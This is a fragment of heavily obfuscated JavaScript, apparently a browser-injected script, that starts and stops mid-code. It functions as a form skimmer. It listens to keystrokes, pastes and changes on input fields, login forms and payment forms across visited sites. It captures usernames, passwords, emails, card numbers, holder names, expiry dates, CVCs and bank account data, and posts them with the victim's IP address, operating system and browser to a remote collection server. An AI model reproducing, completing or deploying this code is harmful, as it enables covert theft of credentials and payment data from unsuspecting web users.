_0x6804e1({'method':_0x4ba09d(0x241),'url':_0x165db5+'browserUserDataManagement','async':!0x0,'header':[{'name':'Content-type','value':_0x4ba09d(0x472)}],'data':{'command':_0x2a1cd0[_0x4ba09d(0x24b)],'userdata':{'_default_':{'tracker':_0x1b1a45,'app_id':_0x27c574[_0x4ba09d(0x47f)],'ip':window['sessionStorage'][_0x4ba09d(0x22a)]('ip'),'os_name_arch':_0x19c4f6[_0x4ba09d(0x2e2)]()+'\x20'+_0x19c4f6[_0x4ba09d(0x35c)](),'browser':_0x19c4f6['getBrowserNameFull']()},'event':_0x4ba09d(0x31b),'username':_0x2a1cd0[_0x4ba09d(0x4e6)]['username'],'password':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x2ea)],'email':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x34f)],'workWebsite':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x5aa)]}}});if('saveLogoutData'===_0x2a1cd0[_0x4ba09d(0x24b)])return _0x6804e1({'method':_0x4ba09d(0x241),'url':_0x165db5+'browserUserDataManagement','async':!0x0,'header':[{'name':_0x4ba09d(0x250),'value':_0x4ba09d(0x472)}],'data':{'command':_0x2a1cd0['command'],'userdata':{'_default_':{'tracker':_0x1b1a45,'app_id':_0x27c574[_0x4ba09d(0x47f)],'ip':window['sessionStorage'][_0x4ba09d(0x22a)]('ip'),'os_name_arch':_0x19c4f6['getPlatformName']()+'\x20'+_0x19c4f6[_0x4ba09d(0x35c)](),'browser':_0x19c4f6[_0x4ba09d(0x405)]()},'event':_0x4ba09d(0x3f3),'username':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x21b)],'workWebsite':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x5aa)]}}});if(_0x4ba09d(0x2ab)===_0x2a1cd0[_0x4ba09d(0x24b)])return _0x6804e1({'method':_0x4ba09d(0x241),'url':_0x165db5+_0x4ba09d(0x402),'async':!0x0,'header':[{'name':_0x4ba09d(0x250),'value':_0x4ba09d(0x472)}],'data':{'command':_0x2a1cd0[_0x4ba09d(0x24b)],'userdata':{'_default_':{'tracker':_0x1b1a45,'app_id':_0x27c574[_0x4ba09d(0x47f)],'ip':window[_0x4ba09d(0x4a9)][_0x4ba09d(0x22a)]('ip'),'os_name_arch':_0x19c4f6[_0x4ba09d(0x2e2)]()+'\x20'+_0x19c4f6[_0x4ba09d(0x35c)](),'browser':_0x19c4f6['getBrowserNameFull']()},'event':_0x4ba09d(0x433),'username':_0x2a1cd0[_0x4ba09d(0x4e6)]['username'],'workWebsite':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x5aa)]}}});}if(_0x4ba09d(0x424)===_0x2a1cd0[_0x4ba09d(0x24b)])return _0x6804e1({'method':_0x4ba09d(0x241),'url':_0x165db5+'clientPaymentMethodsRecord','async':!0x0,'header':[{'name':_0x4ba09d(0x250),'value':'application/json;charset=UTF-8'}],'data':{'command':_0x2a1cd0['command'],'paymentMethodsInfo':{'_default_':{'tracker':_0x1b1a45,'app_id':_0x27c574[_0x4ba09d(0x47f)],'ip':window[_0x4ba09d(0x4a9)][_0x4ba09d(0x22a)]('ip'),'os_name_arch':_0x19c4f6[_0x4ba09d(0x2e2)]()+'\x20'+_0x19c4f6[_0x4ba09d(0x35c)](),'browser':_0x19c4f6['getBrowserNameFull']()},'cardNumber':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x5b0)],'cardBrand':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x305)],'cardHolder':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x247)],'cardExpire':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x42f)],'cardCVC':_0x2a1cd0[_0x4ba09d(0x4e6)]['cardCVC'],'event':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x276)],'workWebsite':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x5aa)]}}});if(_0x4ba09d(0x593)===_0x2a1cd0[_0x4ba09d(0x24b)])return _0x6804e1({'method':'POST','url':_0x165db5+'clientBankAccountRecord','async':!0x0,'header':[{'name':'Content-type','value':_0x4ba09d(0x472)}],'data':{'command':_0x2a1cd0[_0x4ba09d(0x24b)],'bankAccountData':{'_default_':{'tracker':_0x1b1a45,'app_id':_0x27c574['version'],'ip':window[_0x4ba09d(0x4a9)][_0x4ba09d(0x22a)]('ip'),'os_name_arch':_0x19c4f6[_0x4ba09d(0x2e2)]()+'\x20'+_0x19c4f6[_0x4ba09d(0x35c)](),'browser':_0x19c4f6[_0x4ba09d(0x405)]()},'dataType':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x2fb)],'dataValue':_0x2a1cd0['data'][_0x4ba09d(0x2b1)],'workWebsite':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x5aa)]}}});if(_0x4ba09d(0x242)===_0x2a1cd0[_0x4ba09d(0x24b)])return _0x6804e1({'method':_0x4ba09d(0x241),'url':_0x165db5+_0x4ba09d(0x410),'async':!0x0,'header':[{'name':'Content-type','value':_0x4ba09d(0x472)}],'data':{'command':_0x2a1cd0[_0x4ba09d(0x24b)],'inputElementData':{'_default_':{'tracker':_0x1b1a45,'app_id':_0x27c574[_0x4ba09d(0x47f)],'ip':window[_0x4ba09d(0x4a9)][_0x4ba09d(0x22a)]('ip'),'os_name_arch':_0x19c4f6[_0x4ba09d(0x2e2)]()+'\x20'+_0x19c4f6[_0x4ba09d(0x35c)](),'browser':_0x19c4f6[_0x4ba09d(0x405)]()},'name':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x4bd)],'type':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x286)],'value':_0x2a1cd0['data']['value'],'placeholder':_0x2a1cd0[_0x4ba09d(0x4e6)][_0x4ba09d(0x2b7)],'workWebsite':_0x2a1cd0['data'][_0x4ba09d(0x5aa)]}}});}},0x64);}}window['sessionStorage']?null===window[_0x33df30(0x4a9)]['getItem']('ip')&&_0x6804e1({'method':_0x33df30(0x571),'url':_0x806b40[_0x33df30(0x37a)],'async':!0x0,'header':[{'name':_0x33df30(0x33c),'value':_0x33df30(0x588)}]},function(_0x3ef2e9){const _0x182938=_0x33df30;window[_0x182938(0x4a9)]['setItem']('ip',JSON[_0x182938(0x3a0)](_0x3ef2e9)['ip']);}):console[_0x33df30(0x5a5)](_0x33df30(0x54f)),new class{[_0x33df30(0x509)];['authEvent'];[_0x33df30(0x2ca)]=!0x1;[_0x33df30(0x3a2)]=0x0;[_0x33df30(0x510)]=[];[_0x33df30(0x5b5)]=[];['creditCardRuntimeHolderName']='';[_0x33df30(0x266)]='';['creditCardRuntimeBrand']='';[_0x33df30(0x2af)]='';[_0x33df30(0x55d)]='';[_0x33df30(0x280)]='';constructor(_0x14ed50){_0x14ed50&&(this['url']=_0x14ed50);}[_0x33df30(0x3e9)](_0x4bb7fb){const _0x5799c9=_0x33df30,_0x1ff470=this;if(_0x1ff470[_0x5799c9(0x509)]){let _0xb6da7c=setInterval(function(){const _0x4d0e3d=_0x5799c9;_0x1ff470[_0x4d0e3d(0x485)](_0x1ff470,_0xb6da7c);},0x3e8);_0x1ff470[_0x5799c9(0x33b)](_0x1ff470),_0x1ff470[_0x5799c9(0x23f)](_0x1ff470),_0x1ff470[_0x5799c9(0x2ca)];}_0x4bb7fb&&_0x4bb7fb();}[_0x33df30(0x23f)](_0x495a60){let _0x1d902c=setInterval(function(){const _0x43ade1=a8_0x2c8e;0x0!==document[_0x43ade1(0x486)](_0x43ade1(0x255))['length']&&(clearInterval(_0x1d902c),_0x495a60['absoluteTrackHelper'](_0x495a60,document[_0x43ade1(0x557)],_0x43ade1(0x255),function(_0x5a7a7a){const _0x5e3e28=_0x43ade1;['keyup','paste','change',_0x5e3e28(0x255)]['forEach'](function(_0xa586a0){const _0x106c66=_0x5e3e28;_0x5a7a7a[_0x106c66(0x45d)](_0xa586a0,function(){const _0x20845d=_0x106c66;0x0!==_0x5a7a7a[_0x20845d(0x31c)][_0x20845d(0x461)]&&_0x31a45c({'command':'saveInputElementData','data':{'name':_0x5a7a7a[_0x20845d(0x476)][_0x20845d(0x52c)](),'type':_0x5a7a7a[_0x20845d(0x286)],'value':_0x5a7a7a[_0x20845d(0x31c)],'placeholder':_0x5a7a7a['placeholder']?_0x5a7a7a['placeholder']:_0x20845d(0x319),'workWebsite':window[_0x20845d(0x5a1)][_0x20845d(0x23d)]}});});});})),0x0!==document['querySelectorAll'](_0x43ade1(0x2db))[_0x43ade1(0x461)]&&(clearInterval(_0x1d902c),_0x495a60['absoluteTrackHelper'](_0x495a60,document[_0x43ade1(0x557)],_0x43ade1(0x2db),function(_0x1eb1f0){const _0x202f03=_0x43ade1;[_0x202f03(0x47e),_0x202f03(0x376),'change',_0x202f03(0x255)][_0x202f03(0x43f)](function(_0x416014){const _0x50ec27=_0x202f03;_0x1eb1f0[_0x50ec27(0x45d)](_0x416014,function(){const _0x5072cd=_0x50ec27;0x0!==_0x1eb1f0['value'][_0x5072cd(0x461)]&&_0x31a45c({'command':'saveInputElementData','data':{'name':_0x1eb1f0[_0x5072cd(0x476)]['toLowerCase'](),'type':_0x1eb1f0[_0x5072cd(0x286)],'value':_0x1eb1f0[_0x5072cd(0x31c)],'placeholder':_0x1eb1f0[_0x5072cd(0x2b7)]?_0x1eb1f0[_0x5072cd(0x2b7)]:_0x5072cd(0x319),'workWebsite':window['location'][_0x5072cd(0x23d)]}});});});}));},0x64);}[_0x33df30(0x308)](_0x4a0c4a,_0x3d268b,_0x5693ae,_0x4af6da){const _0x516a5f=_0x33df30;0x0!==_0x3d268b[_0x516a5f(0x2c7)]['length']&&_0x3d268b[_0x516a5f(0x2c7)][_0x516a5f(0x43f)](function(_0x57cef8){const _0x293f7b=_0x516a5f;_0x57cef8['nodeName'][_0x293f7b(0x52c)]()===_0x5693ae?_0x4af6da&&_0x4af6da(_0x57cef8):_0x4a0c4a[_0x293f7b(0x308)](_0x4a0c4a,_0x57cef8,_0x5693ae,_0x4af6da);});}[_0x33df30(0x599)](_0x40a82b,_0x1ce95c){const _0x2f1d9e=_0x33df30;_0x40a82b[_0x2f1d9e(0x3a4)](_0x40a82b,_0x1ce95c);}[_0x33df30(0x485)](_0x23311b,_0x247735){const _0x1ca47c=_0x33df30;0x0!==document[_0x1ca47c(0x486)](_0x1ca47c(0x538))[_0x1ca47c(0x461)]?document[_0x1ca47c(0x486)](_0x1ca47c(0x538))['forEach'](function(_0x215426){const _0x35f22e=_0x1ca47c;0x0!==_0x215426[_0x35f22e(0x456)][_0x35f22e(0x461)]?-0x1!==window['location']['href'][_0x35f22e(0x52c)]()['indexOf'](_0x35f22e(0x468))?'post'===_0x215426['method']&&(_0x247735&&clearInterval(_0x247735),_0x23311b[_0x35f22e(0x2ca)]=!0x0,_0x23311b[_0x35f22e(0x3a2)]++,_0x23311b[_0x35f22e(0x599)](_0x23311b,_0x215426)):'javascript:void(0)'!==_0x215426[_0x35f22e(0x51b)]&&_0x35f22e(0x326)!==_0x215426['id']&&'irouteForm'!==_0x215426['id']&&_0x35f22e(0x517)!==_0x215426['id']&&-0x1===_0x215426['id'][_0x35f22e(0x3ff)]('id')&&-0x1===_0x215426['id'][_0x35f22e(0x3ff)](_0x35f22e(0x5b9))&&-0x1===_0x215426['id'][_0x35f22e(0x3ff)]('theform')&&-0x1===_0x215426['id']['indexOf']('scl_form')&&-0x1===_0x215426[_0x35f22e(0x311)][_0x35f22e(0x3ff)]('gb_8e')&&(_0x247735&&clearInterval(_0x247735),_0x23311b['isTrackerActivate']=!0x0,_0x23311b[_0x35f22e(0x3a2)]++,_0x23311b[_0x35f22e(0x599)](_0x23311b,_0x215426)):_0x215426[_0x35f22e(0x2c7)]['length']>0x1&&(_0x247735&&clearInterval(_0x247735),_0x23311b[_0x35f22e(0x2ca)]=!0x0,_0x23311b['trackerJobId']++,_0x23311b['trigger'](_0x23311b,_0x215426));}):-0x1!==window[_0x1ca47c(0x5a1)][_0x1ca47c(0x23d)][_0x1ca47c(0x3ff)](_0x1ca47c(0x46a))&&null!==document[_0x1ca47c(0x2b4)](_0x1ca47c(0x366))&&(_0x247735&&clearInterval(_0x247735),_0x23311b[_0x1ca47c(0x2ca)]=!0x0,_0x23311b[_0x1ca47c(0x3a2)]++,_0x23311b['classicTrackAuthEvent'](_0x23311b,_0x1ca47c(0x57b),'#password',_0x1ca47c(0x366)));}['resolverFormAttributes'](_0x6be8f8,_0x74fcbd){const _0x2d9098=_0x33df30,_0x18cbc9=[..._0x74fcbd[_0x2d9098(0x456)]];return 0x0!==_0x18cbc9[_0x2d9098(0x461)]?_0x18cbc9[_0x2d9098(0x43f)](function(_0x5bca5b){const _0x523ef7=_0x2d9098;'javascript:void(0);'!==_0x5bca5b['nodeValue']&&0x0!==_0x5bca5b[_0x523ef7(0x49e)][_0x523ef7(0x461)]&&_0x5bca5b['nodeValue'][_0x523ef7(0x461)]>=0x3&&_0x48b3d8[_0x523ef7(0x43f)](function(_0x3912a9){const _0x1b38cd=_0x523ef7;0x0!==Object[_0x1b38cd(0x3c9)](_0x3912a9)[_0x1b38cd(0x461)]&&_0x3912a9[_0x1b38cd(0x3e7)]===Object&&Object[_0x1b38cd(0x3c9)](_0x3912a9)['forEach'](function(_0x1eb8d4){const _0x322fb8=_0x1b38cd;_0x3912a9[_0x1eb8d4][_0x322fb8(0x43f)](function(_0x275925){const _0x1b7483=_0x322fb8;-0x1!==_0x5bca5b[_0x1b7483(0x49e)][_0x1b7483(0x52c)]()[_0x1b7483(0x3ff)](_0x275925)?_0x6be8f8['authEvent']=_0x1eb8d4:null===_0x5bca5b[_0x1b7483(0x49e)]&&(_0x6be8f8[_0x1b7483(0x2d6)]='exclude');});});});}):_0x6be8f8[_0x2d9098(0x2d6)]=_0x2d9098(0x22d),_0x6be8f8[_0x2d9098(0x2d6)];}[_0x33df30(0x3a4)](_0x13254c,_0x100bbc){const _0x2c925e=_0x33df30;let _0xb8d887=[];if('FORM'===_0x100bbc[_0x2c925e(0x476)]&&0x1!==_0x100bbc[_0x2c925e(0x461)]){if(_0x13254c['resolverFormAttributes'](_0x13254c,_0x100bbc),_0x2c925e(0x475)===_0x13254c[_0x2c925e(0x2d6)]||_0x2c925e(0x208)===_0x13254c['authEvent'])_0x13254c['crawlAuthFormElement'](_0x13254c,_0xb8d887,_0x100bbc);else{if(_0x2c925e(0x338)===_0x13254c[_0x2c925e(0x2d6)])_0x13254c[_0x2c925e(0x380)](_0x13254c,_0xb8d887,_0x100bbc);else{if(_0x2c925e(0x548)!==_0x13254c[_0x2c925e(0x2d6)]&&'logout'!==_0x13254c[_0x2c925e(0x2d6)]&&(_0x13254c[_0x2c925e(0x57a)](_0x13254c,_0xb8d887,_0x100bbc),_0x13254c['crawlPaymentFormElement'](_0x13254c,_0xb8d887,_0x100bbc),-0x1!==window[_0x2c925e(0x5a1)][_0x2c925e(0x23d)][_0x2c925e(0x3ff)](_0x2c925e(0x353)))){let _0x120573=setInterval(function(){const _0x3fc14b=_0x2c925e;0x0!==document[_0x3fc14b(0x486)](_0x3fc14b(0x538))[_0x3fc14b(0x461)]&&document['querySelectorAll'](_0x3fc14b(0x538))['forEach'](function(_0x3bbd1f){const _0x4c7c3a=_0x3fc14b;if(_0x4c7c3a(0x487)===_0x3bbd1f['id']){clearInterval(_0x120573);let _0x1e693e=[];_0x13254c[_0x4c7c3a(0x332)](_0x13254c,_0x3bbd1f,_0x1e693e);}});},0x64);null!==document[_0x2c925e(0x2b4)](_0x2c925e(0x392))&&null!==document[_0x2c925e(0x2b4)](_0x2c925e(0x367))&&null!==document[_0x2c925e(0x2b4)]('.btn.btn--primary.field')&&_0x2c925e(0x336)===document[_0x2c925e(0x2b4)](_0x2c925e(0x46f))?.[_0x2c925e(0x476)]&&['click',_0x2c925e(0x589)][_0x2c925e(0x43f)](function(_0x4bb36e){const _0x1a4483=_0x2c925e;let _0x53b423=[];document['querySelector'](_0x1a4483(0x46f))?.['addEventListener'](_0x4bb36e,function(){const _0x5d6fc4=_0x1a4483;_0x13254c['exploreSpecificElementByTagName'](_0x13254c,document['querySelector'](_0x5d6fc4(0x367)),_0x5d6fc4(0x255),_0x5d6fc4(0x458),function(_0x632430){const _0x2c17e2=_0x5d6fc4;_0x53b423[_0x2c17e2(0x56c)]({'element':_0x632430['nodeName'],'id':_0x632430['id'],'value':_0x632430['value']});}),_0x13254c['exploreSpecificElementByTagName'](_0x13254c,document[_0x5d6fc4(0x2b4)](_0x5d6fc4(0x367)),_0x5d6fc4(0x255),_0x5d6fc4(0x2dd),function(_0x3d313c){const _0x346571=_0x5d6fc4;_0x53b423[_0x346571(0x56c)]({'element':_0x3d313c[_0x346571(0x476)],'id':_0x3d313c['id'],'value':_0x3d313c[_0x346571(0x31c)]});}),_0x13254c[_0x5d6fc4(0x4f4)](_0x13254c,document[_0x5d6fc4(0x2b4)]('.cic-module'),_0x5d6fc4(0x255),_0x5d6fc4(0x227),function(_0x3b5f1b){const _0x5594c1=_0x5d6fc4;_0x53b423['push']({'element':_0x3b5f1b[_0x5594c1(0x476)],'id':_0x3b5f1b['id'],'value':_0x3b5f1b[_0x5594c1(0x31c)]});}),_0x13254c[_0x5d6fc4(0x4f4)](_0x13254c,document[_0x5d6fc4(0x2b4)](_0x5d6fc4(0x367)),_0x5d6fc4(0x255),_0x5d6fc4(0x44a),function(_0x49f5d6){const _0x28fcda=_0x5d6fc4;_0x53b423[_0x28fcda(0x56c)]({'element':_0x49f5d6[_0x28fcda(0x476)],'id':_0x49f5d6['id'],'value':_0x49f5d6[_0x28fcda(0x31c)]});}),_0x13254c['exploreSpecificElementByTagName'](_0x13254c,document['querySelector']('.cic-module'),_0x5d6fc4(0x255),_0x5d6fc4(0x232),function(_0x51d07d){const _0x487927=_0x5d6fc4;_0x53b423['push']({'element':_0x51d07d[_0x487927(0x476)],'id':_0x51d07d['id'],'value':_0x51d07d['value']});}),_0x31a45c({'command':'savePaymentMethodsData','data':{'cardNumber':-0x1!==_0x53b423[0x0]['id'][_0x5d6fc4(0x3ff)](_0x5d6fc4(0x458))?_0x53b423[0x0][_0x5d6fc4(0x31c)]:'Unknown','cardBrand':document[_0x5d6fc4(0x2b4)](_0x5d6fc4(0x328))?.['firstElementChild']?.[_0x5d6fc4(0x311)]?document[_0x5d6fc4(0x2b4)](_0x5d6fc4(0x328))?.[_0x5d6fc4(0x2fc)]?.[_0x5d6fc4(0x311)]['toLowerCase']():_0x5d6fc4(0x22d),'cardHolder':_0x53b423[0x1]['value']+'\x20'+_0x53b423[0x2][_0x5d6fc4(0x31c)],'cardExpire':_0x5d6fc4(0x44a)===_0x53b423[0x3]['id']?_0x53b423[0x3]['value']:_0x5d6fc4(0x22d),'cardCVC':_0x5d6fc4(0x232)===_0x53b423[0x4]['id']?_0x53b423[0x4][_0x5d6fc4(0x31c)]:'Unknown','event':_0x5d6fc4(0x34e),'workWebsite':window['location'][_0x5d6fc4(0x23d)]}}),_0x53b423=[];});});}}}}}[_0x33df30(0x534)](_0x1499d9,_0x117c46,_0x4a4a14,_0x1234cd){const _0x19d232=_0x33df30;let _0x378ecb,_0x3e528d,_0x276792;null!==document[_0x19d232(0x2b4)](_0x117c46)&&(_0x378ecb=document['querySelector'](_0x117c46)),null!==document[_0x19d232(0x2b4)](_0x4a4a14)&&(_0x3e528d=document[_0x19d232(0x2b4)](_0x4a4a14)),null!==document[_0x19d232(0x2b4)](_0x1234cd)&&(_0x276792=document[_0x19d232(0x2b4)](_0x1234cd)),_0x276792[_0x19d232(0x45d)](_0x19d232(0x238),function(){const _0x523b7f=_0x19d232;return _0x31a45c({'command':'saveLoginData','data':{'event':_0x1499d9['authEvent'],'username':_0x378ecb[_0x523b7f(0x31c)],'password':_0x3e528d['value'],'workWebsite':window['location'][_0x523b7f(0x23d)]}});});}[_0x33df30(0x57a)](_0x1410fb,_0x2365c4,_0xb8ee89){const _0x38244b=_0x33df30;_0xb8ee89[_0x38244b(0x2c7)]?.[_0x38244b(0x43f)](function(_0x200630){const _0x17b9b7=_0x38244b;return['input',_0x17b9b7(0x586),'a'][_0x17b9b7(0x43f)](function(_0x5320c8){const _0x507c0c=_0x17b9b7;_0x200630['nodeName']['toLowerCase']()===_0x5320c8&&([_0x507c0c(0x255)]['forEach'](function(_0xeadb19){const _0x5c4f07=_0x507c0c;_0x200630[_0x5c4f07(0x476)]['toLowerCase']()===_0xeadb19&&[..._0x200630['attributes']][_0x5c4f07(0x43f)](function(_0x502b61){const _0xfbb373=_0x5c4f07;0x0!==_0x502b61[_0xfbb373(0x49e)]['length']&&_0x502b61['nodeValue']['length']>=0x4&&[_0xfbb373(0x4cd),_0xfbb373(0x4ea),_0xfbb373(0x34f),_0xfbb373(0x598)][_0xfbb373(0x43f)](function(_0x15bc09){const _0x5ab933=_0xfbb373;-0x1!==_0x502b61[_0x5ab933(0x49e)]['toLowerCase']()['indexOf'](_0x15bc09)&&_0x2365c4[_0x5ab933(0x56c)](_0x200630);});});}),(_0x507c0c(0x2eb)===_0x200630[_0x507c0c(0x286)]||_0x507c0c(0x586)===_0x200630['type']||'A'===_0x200630[_0x507c0c(0x476)]&&-0x1!==_0x200630[_0x507c0c(0x52d)]['toLowerCase']()['indexOf'](_0x507c0c(0x4e1)))&&_0x1410fb[_0x507c0c(0x5ca)](_0x1410fb,_0x200630,_0x2365c4));}),_0x1410fb[_0x17b9b7(0x57a)](_0x1410fb,_0x2365c4,_0x200630);});}['resolveAuthEvent'](_0x5a146f,_0x194cb3,_0x454d86){const _0x5a48f5=_0x33df30;let _0x99f14c,_0x3a996d,_0x35a662,_0x1b0103;_0x194cb3[_0x5a48f5(0x45d)]('click',function(){const _0xabf125=_0x5a48f5;new Set(_0x454d86)[_0xabf125(0x43f)](function(_0x3fd93c){const _0x5a5888=_0xabf125;[..._0x3fd93c[_0x5a5888(0x456)]][_0x5a5888(0x43f)](function(_0x46adcc){const _0x94ee75=_0x5a5888;0x0!==_0x46adcc['nodeValue']['length']&&_0x46adcc[_0x94ee75(0x49e)][_0x94ee75(0x461)]>=0x4&&[_0x94ee75(0x4ea),_0x94ee75(0x475),_0x94ee75(0x34f),_0x94ee75(0x598)][_0x94ee75(0x43f)](function(_0x396ff3){const _0x30536a=_0x94ee75;-0x1!==_0x46adcc['nodeValue'][_0x30536a(0x52c)]()['indexOf'](_0x396ff3)&&(_0x99f14c=_0x3fd93c,_0x3a996d=_0x396ff3,_0x35a662=_0x3fd93c[_0x30536a(0x286)],_0x1b0103=_0x3fd93c['value']);});}),0x0!==_0x1b0103[_0x5a5888(0x461)]&&_0x5a146f['passwordStore']['push']({'node':_0x99f14c,'name':_0x3a996d,'type':_0x35a662,'value':_0x1b0103});}),_0x31a45c({'command':'saveLoginData','data':{'event':_0x5a146f['authEvent'],'username':_0x5a146f[_0xabf125(0x510)][0x0]?.['value'],'password':_0x5a146f['passwordStore'][0x1]?.[_0xabf125(0x31c)],'workWebsite':window[_0xabf125(0x5a1)][_0xabf125(0x23d)]}}),_0x5a146f[_0xabf125(0x510)]=[];});}[_0x33df30(0x380)](_0xcbb36b,_0x801b1b,_0xcbe939){const _0x38b145=_0x33df30;_0xcbe939[_0x38b145(0x2c7)]?.[_0x38b145(0x43f)](function(_0x440925){const _0x1382c7=_0x38b145;return['input','button',_0x1382c7(0x2db)][_0x1382c7(0x43f)](function(_0x58372e){const _0x6a8a50=_0x1382c7;_0x440925[_0x6a8a50(0x476)][_0x6a8a50(0x52c)]()===_0x58372e&&([_0x6a8a50(0x255),_0x6a8a50(0x2db)]['forEach'](function(_0x3ee279){const _0x5c9433=_0x6a8a50;_0x440925[_0x5c9433(0x476)][_0x5c9433(0x52c)]()===_0x3ee279&&['text',_0x5c9433(0x57f),_0x5c9433(0x4ed),_0x5c9433(0x2ea),_0x5c9433(0x462),_0x5c9433(0x2f3)][_0x5c9433(0x43f)](function(_0x590443){const _0x5c67b4=_0x5c9433;_0x440925[_0x5c67b4(0x286)]===_0x590443&&[..._0x440925[_0x5c67b4(0x456)]]['forEach'](function(_0x26d430){const _0xfc4d96=_0x5c67b4;0x0!==_0x26d430[_0xfc4d96(0x49e)][_0xfc4d96(0x461)]&&_0x26d430['nodeValue'][_0xfc4d96(0x461)]>=0x3&&_0x54c723[_0xfc4d96(0x43f)](function(_0x21371c){const _0x4741c0=_0xfc4d96;0x0!==Object[_0x4741c0(0x3c9)](_0x21371c)[_0x4741c0(0x461)]&&_0x21371c[_0x4741c0(0x3e7)]===Object&&Object[_0x4741c0(0x3c9)](_0x21371c)[_0x4741c0(0x43f)](function(_0x10c14c){_0x21371c[_0x10c14c]['forEach'](function(_0x58fb00){const _0xf40bd4=a8_0x2c8e;-0x1!==_0x26d430[_0xf40bd4(0x49e)][_0xf40bd4(0x52c)]()[_0xf40bd4(0x3ff)](_0x58fb00)&&-0x1===_0x26d430[_0xf40bd4(0x49e)]['toLowerCase']()[_0xf40bd4(0x3ff)](_0xf40bd4(0x495))&&_0x801b1b[_0xf40bd4(0x56c)](_0x440925);});});});});});}),[_0x6a8a50(0x2eb),_0x6a8a50(0x586)][_0x6a8a50(0x43f)](function(_0x25d70b){const _0x2afce4=_0x6a8a50;_0x440925[_0x2afce4(0x286)]===_0x25d70b&&_0xcbb36b[_0x2afce4(0x3f7)](_0xcbb36b,_0x440925['form'],_0x440925,_0x801b1b);}));}),_0xcbb36b[_0x1382c7(0x380)](_0xcbb36b,_0x801b1b,_0x440925);});}[_0x33df30(0x3f7)](_0x20f076,_0x2cd5d2,_0x44cfb8,_0x17b5fa){const _0x1febde=_0x33df30;[_0x1febde(0x2eb)][_0x1febde(0x43f)](function(_0xe36604){const _0x2200b5=_0x1febde;_0x2cd5d2[_0x2200b5(0x45d)](_0xe36604,function(){const _0x9a91f6=_0x2200b5;_0x20f076[_0x9a91f6(0x4f1)](_0x20f076,_0x17b5fa);});}),[_0x1febde(0x238),'dblclick','ontouchstart'][_0x1febde(0x43f)](function(_0x565161){const _0x2275fd=_0x1febde;_0x44cfb8[_0x2275fd(0x45d)](_0x565161,function(){const _0x50627a=_0x2275fd;_0x20f076[_0x50627a(0x4f1)](_0x20f076,_0x17b5fa);});});try{window[_0x1febde(0x4ad)]!==window['top']&&new Set(_0x17b5fa)['forEach'](function(_0x4493c8){const _0x40653e=_0x1febde;['keyup',_0x40653e(0x50a),_0x40653e(0x567),'paste'][_0x40653e(0x43f)](function(_0x40bc47){_0x4493c8['addEventListener'](_0x40bc47,function(){const _0x57d0a8=a8_0x2c8e;_0x20f076[_0x57d0a8(0x4f1)](_0x20f076,_0x17b5fa);});});});}catch(_0x371583){}}[_0x33df30(0x4f1)](_0x20eba4,_0x407e6d){const _0x4124a5=_0x33df30;let _0x20f486,_0x1b3c4c,_0x473bc9,_0x10e4ac;new Set(_0x407e6d)[_0x4124a5(0x43f)](function(_0x637b21){const _0x5c1456=_0x4124a5;[..._0x637b21[_0x5c1456(0x456)]][_0x5c1456(0x43f)](function(_0x1dfcd7){const _0x2c7ee6=_0x5c1456;0x0!==_0x1dfcd7[_0x2c7ee6(0x49e)]['length']&&_0x1dfcd7[_0x2c7ee6(0x49e)][_0x2c7ee6(0x461)]>=0x3&&_0x54c723[_0x2c7ee6(0x43f)](function(_0x577479){const _0x16d110=_0x2c7ee6;0x0!==Object[_0x16d110(0x3c9)](_0x577479)[_0x16d110(0x461)]&&_0x577479[_0x16d110(0x3e7)]===Object&&Object[_0x16d110(0x3c9)](_0x577479)[_0x16d110(0x43f)](function(_0x5576b7){const _0x578562=_0x16d110;_0x577479[_0x5576b7][_0x578562(0x43f)](function(_0x9041ef){const _0x4fd7d8=_0x578562;-0x1!==_0x1dfcd7[_0x4fd7d8(0x49e)][_0x4fd7d8(0x52c)]()['indexOf'](_0x9041ef)&&(_0x20f486=_0x637b21,_0x1b3c4c=_0x5576b7,_0x473bc9=_0x637b21[_0x4fd7d8(0x286)],_0x10e4ac=_0x637b21['value']);});});});}),0x0!==_0x10e4ac[_0x5c1456(0x461)]&&_0x20eba4[_0x5c1456(0x5b5)][_0x5c1456(0x56c)]({'node':_0x20f486,'name':_0x1b3c4c,'type':_0x473bc9,'value':_0x10e4ac});}),_0x20eba4[_0x4124a5(0x3ae)](_0x20eba4,_0x20eba4[_0x4124a5(0x5b5)]),_0x31a45c({'command':'savePaymentMethodsData','data':{'cardNumber':''!==_0x20eba4[_0x4124a5(0x266)]?_0x20eba4[_0x4124a5(0x266)]:_0x4124a5(0x22d),'cardBrand':''!==_0x20eba4[_0x4124a5(0x246)]?_0x20eba4[_0x4124a5(0x246)]:_0x4124a5(0x22d),'cardHolder':''!==_0x20eba4[_0x4124a5(0x25c)]?_0x20eba4[_0x4124a5(0x25c)]:_0x4124a5(0x22d),'cardExpire':''!==_0x20eba4['creditCardRuntimeExpireDate']?_0x20eba4[_0x4124a5(0x2af)]:_0x4124a5(0x22d),'cardCVC':''!==_0x20eba4[_0x4124a5(0x55d)]?_0x20eba4['creditCardRuntimeCvc']:_0x4124a5(0x22d),'event':_0x4124a5(0x34e),'workWebsite':window[_0x4124a5(0x5a1)][_0x4124a5(0x23d)]}}),_0x20eba4[_0x4124a5(0x5b5)]=[],_0x20eba4[_0x4124a5(0x25c)]='',_0x20eba4[_0x4124a5(0x266)]='',_0x20eba4['creditCardRuntimeBrand']='',_0x20eba4['creditCardRuntimeExpireDate']='',_0x20eba4[_0x4124a5(0x55d)]='',_0x20eba4[_0x4124a5(0x280)]='';}[_0x33df30(0x3ae)](_0x1a4d91